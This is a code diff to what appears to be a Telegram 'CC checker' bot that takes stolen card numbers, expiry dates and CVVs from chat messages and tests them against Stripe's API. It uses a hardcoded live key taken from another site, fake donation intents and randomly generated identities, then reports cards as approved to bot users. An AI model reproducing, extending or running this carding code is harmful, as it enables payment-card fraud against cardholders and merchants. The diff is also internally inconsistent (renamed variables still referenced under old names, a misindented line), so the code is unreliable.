@@ -129,65 +129,33 @@ def chk(update,context):
     maintxt=text[-1]
     i=maintxt.split("|")
     cc=i[0]
-    mon=i[1]
-    year=i[2]
+    mes=i[1]
+    ano=i[2]
     cvv=i[3]
-    email = f"{str(rnd)}@gmail.com"
-    skeys = OrderedDict([(1,'pk_live_omFDE4PpGEioGWha5NXjoPJo')]);
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0","Accept": "application/json, text/plain, */*","Content-Type": "application/x-www-form-urlencoded"}
-    s = requests.post("https://m.stripe.com/6",headers=headers)
-    r = s.json()
-    Guid = r["guid"]
-    Muid = r["muid"]
-    Sid = r["sid"]
-    payload = {
-      "lang": "en",
-      "type": "donation",
-      "currency": "USD",
-      "amount": "5",
-      "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
-      "currencySign": "$"
-    }
-    
-
-    
-
-    load = {
-      "receipt_email": email,
-      "payment_method_data[type]": "card",
-      "payment_method_data[billing_details][email]": email,
-      "payment_method_data[card][number]": cc,
-      "payment_method_data[card][cvc]": cvv,
-      "payment_method_data[card][exp_month]": mon,
-      "payment_method_data[card][exp_year]": year,
-      "payment_method_data[guid]": Guid,
-      "payment_method_data[muid]": Muid,
-      "payment_method_data[sid]": Sid,
-      "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
-      "payment_method_data[referrer]": "https://adblockplus.org/",
-      "expected_payment_method_type": "card",
-      "use_stripe_sdk": "true",
-      "webauthn_uvpa_available": "true",
-      "spc_eligible": "false",
-      "key": "pk_live_omFDE4PpGEioGWha5NXjoPJo",
-      "client_secret" : "noi"
-    }
-    
-    header = {
-      "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
-      "Content-Type": "application/x-www-form-urlencoded",
-      "Accept": "application/json",
-      "Origin": "https://js.stripe.com",
-      "Referer": "https://js.stripe.com/",
-      "Accept-Language": "en-US,en;q=0.9"
-    }
-    
-    rx = requests.post(f"https://api.stripe.com/v1/payment_intents",
-                     data=load, headers=header)
-    res = rx.json()
+    sk_headers = {
+    "authority": "api.stripe.com",
+    "accept": "application/json",
+    "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
+    "content-type": "application/x-www-form-urlencoded",
+    "origin": "https://js.stripe.com",
+    "referer": "https://js.stripe.com/",
+    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}
+     res = requests.get("https://randomuser.me/api/?nat=us&inc=name,location")
+    random_data = json.loads(res.text)
+    first_name = random_data['results'][0]['name']['first'] 
+    last_name = random_data['results'][0]['name']['last']
+    street = str(random_data['results'][0]['location']['street']['number']) +" " +random_data['results'][0]['location']['street']['name'] 
+    city = random_data['results'][0]['location']['city'] 
+    state = random_data['results'][0]['location']['state']
+    zip = random_data['results'][0]['location']['postcode']
+    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))) + '@gmail.com' 
+    password = str("".join(random.choices(string.ascii_uppercase + string.digits, k=10))) 
+    data = f"time_on_page=38212&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_omFDE4PpGEioGWha5NXjoPJo&payment_user_agent=stripe.js%2F308cc4f&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_line1]={street}&card[address_line2]=&card[address_city]={city}&card[address_state]={state}&card[address_zip]={zip}&card[address_country]=US&card[cvc]={cvv}&card[name]={first_name}+{last_name}"
+    response = requests.post('https://api.stripe.com/v1/tokens', headers=sk_headers, data=data)
+    res = response.json()
     msg = res["error"]["message"]
     toc = time.perf_counter()
-    if "incorrect_cvc" in rx.text:
+    if "incorrect_cvc" in response.text:
         text = (f"""
 ✅CC➟ <code>{cc[:7]}xxxxxxx|{mon}|{year}|{cvv}</code> \n
 STATUS ➟ #ApprovedCCN \n
@@ -197,7 +165,7 @@ CHECKED BY @ASURCCWORLDBOT \n
 Used by @{userid}
 """)
         Sendmessage(chat_id , text)
-    elif "Unrecognized request URL" in rx.text:
+    elif "Unrecognized request URL" in response.text:
         text = ("[UPDATE] PROXIES ERROR")
         Sendmessage(chat_id , text)
     elif rx.status_code == 200:
